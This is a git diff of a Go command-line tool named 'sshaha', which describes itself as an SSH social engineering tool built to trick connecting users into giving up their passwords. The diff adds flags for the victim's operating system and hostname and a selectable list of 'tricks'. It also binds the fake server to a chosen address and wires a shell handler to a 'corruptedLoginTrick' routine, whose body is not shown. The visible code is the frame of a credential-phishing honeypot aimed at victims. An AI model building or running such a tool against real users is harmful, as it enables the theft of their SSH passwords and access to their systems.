@@ -14,8 +14,24 @@ import (
 
 	"github.com/kr/pty"
 	"github.com/spf13/cobra"
+	"github.com/spf13/viper"
 	"golang.org/x/crypto/ssh"
 )
+
+var (
+	sessionID = 1
+)
+
+func init() {
+	rootCmd.PersistentFlags().StringP("victimOS", "v", "ubuntu", "The operating system of the connecting victim")
+	rootCmd.PersistentFlags().StringP("serverOS", "s", "ubuntu", "What operating system this sshaha will pretend to be")
+	rootCmd.PersistentFlags().StringP("victimHostname", "o", "localhost", "The hostname of the victims machine")
+	rootCmd.PersistentFlags().StringArrayP("tricks", "t", []string{"all"}, "The tricks that the server will run on the victim")
+	viper.BindPFlag("victimOS", rootCmd.PersistentFlags().Lookup("victimOS"))
+	viper.BindPFlag("serverOS", rootCmd.PersistentFlags().Lookup("serverOS"))
+	viper.BindPFlag("victimHostname", rootCmd.PersistentFlags().Lookup("victimHostname"))
+	viper.BindPFlag("tricks", rootCmd.PersistentFlags().Lookup("tricks"))
+}
 
 // Execute run things
 func Execute() {
@@ -23,14 +39,16 @@ func Execute() {
 		fmt.Println(err)
 		os.Exit(1)
 	}
-
 }
 
 var rootCmd = &cobra.Command{
-	Use:   "blah",
-	Short: "blah blah",
-	Long:  `blag blah blah`,
+	Use:   "sshaha <ip> <port>",
+	Short: "ssh social engineering tool",
+	Long:  `sshaha is designed to trick unwary users that connect to it into giving up their passwords`,
+	Args:  cobra.ExactArgs(2),
 	Run: func(cmd *cobra.Command, args []string) {
+		ip := args[0]
+		port := args[1]
 		config := &ssh.ServerConfig{
 			NoClientAuth: true,
 			// Remove to disable password auth.
@@ -46,17 +64,14 @@ var rootCmd = &cobra.Command{
 		if err != nil {
 			log.Fatal("couldn't generate keys")
 		}
-
 		private, err := ssh.ParsePrivateKey(priv)
 		if err != nil {
 			log.Fatal("Failed to parse private key: ", err)
 		}
-
 		config.AddHostKey(private)
-
 		// Once a ServerConfig has been configured, connections can be
 		// accepted.
-		listener, err := net.Listen("tcp", "127.0.0.1:2022")
+		listener, err := net.Listen("tcp", fmt.Sprintf("%s:%s", ip, port))
 		if err != nil {
 			log.Fatal("failed to listen for connection: ", err)
 		}
@@ -75,6 +90,17 @@ func listenForConnections(listener net.Listener, config *ssh.ServerConfig) {
 	}
 }
 
+// GetOutboundIP Get preferred outbound ip of this machine
+func GetOutboundIP() string {
+	conn, err := net.Dial("udp", "8.8.8.8:80")
+	if err != nil {
+		return "localhost"
+	}
+	defer conn.Close()
+	localAddr := conn.LocalAddr().(*net.UDPAddr)
+	return localAddr.IP.String()
+}
+
 func assignSSHServer(nConn net.Conn, config *ssh.ServerConfig) {
 	conn, chans, reqs, err := ssh.NewServerConn(nConn, config)
 	if err != nil {
@@ -86,12 +112,12 @@ func assignSSHServer(nConn net.Conn, config *ssh.ServerConfig) {
 	connectionDetails := map[string]string{
 		"username":   username,
 		"sshVersion": sshVersion,
+		"hostIP":     GetOutboundIP(),
 	}
 	// The incoming Request channel must be serviced.
 	go ssh.DiscardRequests(reqs)
 	// Service the incoming Channel channel.
 	handleChannels(chans, connectionDetails)
-
 }
 
 // generateSSHKeys returns two byte slices filled with new, pem block encoded private and public keys
@@ -122,8 +148,6 @@ func generateSSHKeys() (pub []byte, priv []byte, err error) {
 	return pub, priv, nil
 }
 
-// https://github.com/Scalingo/go-ssh-examples/blob/master/server_complex.go
-
 func handleExec() bool {
 	return true
 }
@@ -136,10 +160,11 @@ func handleEnv(req *ssh.Request) bool {
 	return true
 }
 
-func handleShell(channel ssh.Channel, req *ssh.Request, tty *os.File, f *os.File, connDetails map[string]string) bool {
-	// gnomeKeychainTrick(channel)
-	signalsTrick(channel, connDetails)
-	//test(channel)
+func handleShell(channel ssh.Channel, connDetails map[string]string) bool {
+	log.Printf("shell session started")
+	sessionID = sessionID + 1
+	corruptedLoginTrick(channel, connDetails)
+	//passwordIncorrectTrick(channel, connDetails)
 	return true
 }
 
@@ -150,7 +175,7 @@ func handleRequest(in <-chan *ssh.Request, channel ssh.Channel, tty *os.File, f 
 		case "exec":
 			ok = handleExec()
 		case "shell":
-			ok = handleShell(channel, req, tty, f, connDetails)
+			ok = handleShell(channel, connDetails)
 		case "pty-req":
 			ok = handlePty()
 		case "window-change":
